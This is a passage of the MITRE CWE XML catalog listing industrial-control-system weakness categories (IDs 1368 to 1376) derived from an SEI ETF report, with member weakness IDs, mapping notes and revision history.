            <Has_Member CWE_ID="1247" View_ID="1358"/>
            <Has_Member CWE_ID="1338" View_ID="1358"/>
            <Has_Member CWE_ID="1357" View_ID="1358"/>
            <Has_Member CWE_ID="1384" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="ICS Dependencies (&amp; Architecture)"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1368" Name="ICS Dependencies (&amp; Architecture): External Digital Systems" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "External Digital Systems" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Due to the highly interconnected technologies in use, an external dependency on another digital system could cause a confidentiality, integrity, or availability incident for the protected system." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
		   <Has_Member CWE_ID="15" View_ID="1358"/>
		   <Has_Member CWE_ID="287" View_ID="1358"/>
		   <Has_Member CWE_ID="306" View_ID="1358"/>
		   <Has_Member CWE_ID="308" View_ID="1358"/>
		   <Has_Member CWE_ID="312" View_ID="1358"/>
		   <Has_Member CWE_ID="440" View_ID="1358"/>
		   <Has_Member CWE_ID="470" View_ID="1358"/>
		   <Has_Member CWE_ID="603" View_ID="1358"/>
		   <Has_Member CWE_ID="610" View_ID="1358"/>
		   <Has_Member CWE_ID="638" View_ID="1358"/>
		   <Has_Member CWE_ID="1059" View_ID="1358"/>
		   <Has_Member CWE_ID="1068" View_ID="1358"/>
		   <Has_Member CWE_ID="1104" View_ID="1358"/>
		   <Has_Member CWE_ID="1329" View_ID="1358"/>
		   <Has_Member CWE_ID="1357" View_ID="1358"/>
		   <Has_Member CWE_ID="1393" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="ICS Dependencies (&amp; Architecture)"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Version>4.10</Contribution_Version>
               <Contribution_ReleaseDate>2023-01-24</Contribution_ReleaseDate>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-06-29</Contribution_Date>
               <Contribution_Version>4.12</Contribution_Version>
               <Contribution_ReleaseDate>2023-06-29</Contribution_ReleaseDate>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1369" Name="ICS Supply Chain: IT/OT Convergence/Expansion" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "IT/OT Convergence/Expansion" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "The increased penetration of DER devices and smart loads make emerging ICS networks more like IT networks and thus susceptible to vulnerabilities similar to those of IT networks." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="636" View_ID="1358"/>
            <Has_Member CWE_ID="284" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="IT/OT Convergence/Expansion"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category might be subject to CWE Scope Exclusion SCOPE.SITUATIONS (Focus on situations in which weaknesses may appear).</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1370" Name="ICS Supply Chain: Common Mode Frailties" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Common Mode Frailties" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "At the component level, most ICS systems are assembled from common parts made by other companies. One or more of these common parts might contain a vulnerability that could result in a wide-spread incident." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
	    <Has_Member CWE_ID="664" View_ID="1358"/>
	    <Has_Member CWE_ID="707" View_ID="1358"/>
	    <Has_Member CWE_ID="710" View_ID="1358"/>
            <Has_Member CWE_ID="1357" View_ID="1358"/>
            <Has_Member CWE_ID="329" View_ID="1358"/>
            <Has_Member CWE_ID="693" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1260"/>
            <Reference External_Reference_ID="REF-1248" Section="Common Mode Frailties"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-26</Contribution_Date>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1371" Name="ICS Supply Chain: Poorly Documented or Undocumented Features" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Poorly Documented or Undocumented Features" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Undocumented capabilities and configurations pose a risk by not having a clear understanding of what the device is specifically supposed to do and only do. Therefore possibly opening up the attack surface and vulnerabilities." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="489" View_ID="1358"/>
            <Has_Member CWE_ID="912" View_ID="1358"/>
            <Has_Member CWE_ID="1059" View_ID="1358"/>
            <Has_Member CWE_ID="1242" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Poorly Documented or Undocumented Features"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1372" Name="ICS Supply Chain: OT Counterfeit and Malicious Corruption" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "OT Counterfeit and Malicious Corruption" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "In ICS, when this procurement process results in a vulnerability or component damage, it can have grid impacts or cause physical harm." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="1278" View_ID="1358"/>
            <Has_Member CWE_ID="1198" View_ID="1358"/>
            <Has_Member CWE_ID="1231" View_ID="1358"/>
            <Has_Member CWE_ID="1233" View_ID="1358"/>
            <Has_Member CWE_ID="284" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="OT Counterfeit and Malicious Corruption"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category might be subject to CWE Scope Exclusion SCOPE.HUMANPROC (Human/organizational process).</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1373" Name="ICS Engineering (Construction/Deployment): Trust Model Problems" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Trust Model Problems" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Assumptions made about the user during the design or construction phase may result in vulnerabilities after the system is installed if the user operates it using a different security approach or process than what was designed or built." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="269" View_ID="1358"/>
            <Has_Member CWE_ID="807" View_ID="1358"/>
            <Has_Member CWE_ID="349" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Trust Model Problems"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1374" Name="ICS Engineering (Construction/Deployment): Maker Breaker Blindness" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Maker Breaker Blindness" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Lack of awareness of deliberate attack techniques by people (vs failure modes from natural causes like weather or metal fatigue) may lead to insufficient security controls being built into ICS systems." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Maker Breaker Blindness"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1375" Name="ICS Engineering (Construction/Deployment): Gaps in Details/Data" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Gaps in Details/Data" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "Highly complex systems are often operated by personnel who have years of experience in managing that particular facility or plant. Much of their knowledge is passed along through verbal or hands-on training but may not be fully documented in written practices and procedures." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="1059" View_ID="1358"/>
            <Has_Member CWE_ID="1110" View_ID="1358"/>
	    <Has_Member CWE_ID="710" View_ID="1358"/>
	    <Has_Member CWE_ID="1053" View_ID="1358"/>
	    <Has_Member CWE_ID="1111" View_ID="1358"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1248" Section="Gaps in Details/Data"/>
         </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a Category. Using categories for mapping has been discouraged since 2019. Categories are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
            <Comments>See member weaknesses of this category.</Comments>
            <Reasons>
               <Reason Type="Category"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Relationship">Relationships in this category are not authoritative and subject to change. See Maintenance notes.</Note>
	   <Note Type="Maintenance">This category might be subject to CWE Scope Exclusion SCOPE.HUMANPROC (Human/organizational process).</Note>
	   <Note Type="Maintenance">This category was created in CWE 4.7 to facilitate and illuminate discussion about weaknesses in ICS with [REF-1248] as a starting point. After the release of CWE 4.9 in October 2022, this has been under active review by members of the "Boosting CWE" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG). Relationships are still subject to change. In addition, there may be some issues in [REF-1248] that are outside of the current scope of CWE, which will require consultation with many CWE stakeholders to resolve.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>New Categories of Security Vulnerabilities (NCSV) Technical Project Team (TPT)</Submission_Name>
               <Submission_Organization>Securing Energy Infrastructure Executive Task Force</Submission_Organization>
               <Submission_Date>2022-03-09</Submission_Date>
               <Submission_Version>4.7</Submission_Version>
               <Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Boosting CWE Content" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
               <Contribution_Comment>Suggested weaknesses to add to this category.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Category>
      <Category ID="1376" Name="ICS Engineering (Construction/Deployment): Security Gaps in Commissioning" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the "Security Gaps in Commissioning" category from the SEI ETF "Categories of Security Vulnerabilities in ICS" as published in March 2022: "As a large system is brought online components of the system may remain vulnerable until the entire system is operating and functional and security controls are put in place. This creates a window of opportunity for an adversary during the commissioning process." Note: members of this category include "Nearest IT Neighbor" recommendations from the report, as well as suggestions by the CWE team. These relationships are likely to change in future CWE versions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="276" View_ID="1358"/>
            <Has_Member CWE_ID="362" View_ID="1358"/>
